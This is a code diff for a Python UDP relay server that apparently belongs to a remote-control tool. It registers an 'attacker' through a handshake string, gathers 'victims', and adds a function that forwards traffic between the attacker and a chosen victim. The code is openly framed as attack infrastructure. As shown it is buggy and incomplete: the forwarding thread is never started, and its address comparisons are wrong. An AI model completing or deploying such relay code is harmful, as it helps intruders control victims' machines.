@@ -3,6 +3,13 @@ from threading import Thread
 
 
 # read ab RDP
+def forward(server_socket: socket.socket, atacker_ip: tuple, targeted_victim_ip: tuple):
+    while 1:
+        data, ip = server_socket.recvfrom(1024)
+        if ip is atacker_ip:
+            server_socket.sendto(data=data, address=targeted_victim_ip)
+        elif ip is targeted_victim_ip:
+            server_socket.sendto(data=data, address=atacker_ip)
 
 
 def accept_for_new_victims(server_socket_for_new_users, victims_ip_list):
@@ -13,7 +20,7 @@ def accept_for_new_victims(server_socket_for_new_users, victims_ip_list):
 
 
 def main():
-    attacket_ip = ""
+    attacker_ip = ""
     victims_ip_list = []
 
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -28,15 +35,14 @@ def main():
     data = data.decode()
     if data == "i am the attacker":
         print("attacker_conected")
-        attacket_ip = ip
-    print(attacket_ip)
-    Thread(
-        target=accept_for_new_victims, args=(socket_for_victims, victims_ip_list)
-    ).start()
+        attacker_ip = ip
+    print(attacker_ip)
+    Thread(target=accept_for_new_victims, args=(socket_for_victims, victims_ip_list)).start()
     while not victims_ip_list:
         pass
     targeted_victim_ip = victims_ip_list[0]
     print(targeted_victim_ip, "is the target")
+    Thread(target=forward, args=(server_socket, attacker_ip, targeted_victim_ip))
 
 
 if __name__ == "__main__":
